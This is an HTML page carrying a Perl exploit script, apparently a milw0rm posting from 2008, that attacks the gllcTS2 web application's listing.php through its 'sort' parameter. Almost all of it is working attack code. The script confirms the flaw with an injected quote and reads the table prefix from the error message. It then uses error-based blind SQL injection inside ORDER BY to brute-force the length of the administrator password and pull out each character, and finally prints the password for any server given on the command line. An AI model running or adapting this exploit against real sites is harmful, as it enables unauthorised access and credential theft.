<html><head><title>GLLCTS2 (listing.php sort) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
######################
#
#gllcTS2 (listing.php $sort) Remote Blind SQL Injection Exploit
#
######################
#
#Bug by: h0yt3r
#
##
###
##
#
#This one shows another vulnerability in the gllcTS2. (Thera are many with simple injections)
#Same Versions are affected.
#Also shows the conecpt of how to inject an ORDER BY statement via Blind Injection and
#WITHOUT benchmark(), means we produce an error if the IF statement returns TRUE.
#
#Gr33tz go to:
#b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team
#
################
use LWP::UserAgent;
my $userAgent = LWP::UserAgent-&gt;new;

usage();

$server = $ARGV[0];
$dir = $ARGV[1];


print&quot;\n&quot;;
if (!$dir) { die &quot;Read Usage!\n&quot;; }


$filename =&quot;listing.php&quot;;

my $vulnCheck = &quot;http://&quot;.$server.$dir.$filename;

my $prefix =&quot;&quot;;

my @Daten = (&quot;61&quot;,&quot;62&quot;,&quot;63&quot;,&quot;64&quot;,&quot;65&quot;,&quot;66&quot;,&quot;67&quot;,&quot;68&quot;,&quot;69&quot;,&quot;6A&quot;,&quot;6B&quot;,&quot;6C&quot;,&quot;6D&quot;,&quot;6E&quot;,&quot;6F&quot;,&quot;70&quot;,&quot;71&quot;,&quot;72&quot;,&quot;73&quot;,&quot;74&quot;,&quot;75&quot;,&quot;76&quot;,&quot;77&quot;,&quot;78&quot;,&quot;79&quot;,&quot;7A&quot;,&quot;3A&quot;,&quot;5F&quot;,&quot;31&quot;,&quot;32&quot;,&quot;33&quot;,&quot;34&quot;,&quot;35&quot;,&quot;36&quot;,&quot;37&quot;,&quot;38&quot;,&quot;39&quot;,&quot;30&quot;);

my $Attack= $userAgent-&gt;get($vulnCheck);
if ($Attack-&gt;is_success)
{
    print &quot;[x]Attacking &quot;.$vulnCheck.&quot;\n&quot;;
}
else
{
    print &quot;Couldn't connect to &quot;.$vulnCheck.&quot;!&quot;;
    exit;
}

print &quot;[x]Vulnerable Check:&quot;;

my $check = $vulnCheck.&quot;?sort='&quot;;

my $Attack= $userAgent-&gt;get($check);
if($Attack-&gt;content =~ m/FROM (.*?)_weblist/i)
{
    print &quot; Vulnerable!\n&quot;;    
    $prefix = $1;
}
else
{
    print &quot; Not Vulnerable!&quot;;
    exit;
}

my $hex=&quot;&quot;;
my $length;

print &quot;[x]Bruteforcing Length\n&quot;;

my $lengthCounter = 1;
while(1)
{
    #To inject ORDER BY (where we cannot union select) we just have to pass a simple IF statement.
    #Instead of Benchmark() we can use a subquery which, in this case, would return &quot;Subquery returns more than 1 row&quot; if the statement actualle is true.
    my $url = &quot;&quot;.$vulnCheck.&quot;?sort=IF(LENGTH((select admin_pass from &quot;.$prefix.&quot;_admin))=&quot;.$lengthCounter.&quot;,(select 1 union select 5),null)&amp;direction=desc&amp;showgroup=all&quot;;
    my $Attack= $userAgent-&gt;get($url);
    my $content = $Attack-&gt;content;
    if($content =~ m/Please contact a the site admin immediately./i)
    {        
        $length=$lengthCounter;        
        last;        
    }
    else
    {
        $lengthCounter++;    
    }
}


print &quot;[x]Injecting Black Magic\n&quot;;

for($b=1;$b&lt;=$length;$b++)
{
    for(my $u=0;$u&lt;28;$u++)
    {                                                            
        my $url = &quot;&quot;.$vulnCheck.&quot;?sort=IF(substring((select admin_pass from &quot;.$prefix.&quot;_admin),&quot;.$b.&quot;,1)=0x&quot;.$Daten[$u].&quot;,(select 1 union select 5),null)&amp;direction=desc&amp;showgroup=all&quot;;

        my $Attack= $userAgent-&gt;get($url);

        my $content = $Attack-&gt;content;        
        
        if($content =~ m/Please contact a the site admin immediately./i)   
        {            
            print &quot;[x]    Found Char &quot;.$Daten[$u].&quot;\n&quot;;            
            $hex=$hex.$Daten[$u];
            last;
        }

        else
        {
            #Whatever...            
        }
    }
}

print &quot;[x]Converting \n&quot;;
my $a_str = hex_to_ascii($hex);

print &quot;[x]Success! \n&quot;;
print &quot;     Adminpassword: $a_str\n&quot;;
    
sub hex_to_ascii ($)
{        
        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
        return $str;
}

sub usage()
{
    print q
    {
    ######################################################
              gllcTS2 Remote Blind SQL Injection Exploit            
                         -Written  by h0yt3r-                       
    Usage: gllcts2.pl [Server] [Path]
    Sample:
    perl gllcts2.pl www.site.com /cms/
    ######################################################
    };

} 

# milw0rm.com [2008-06-13]</pre></html>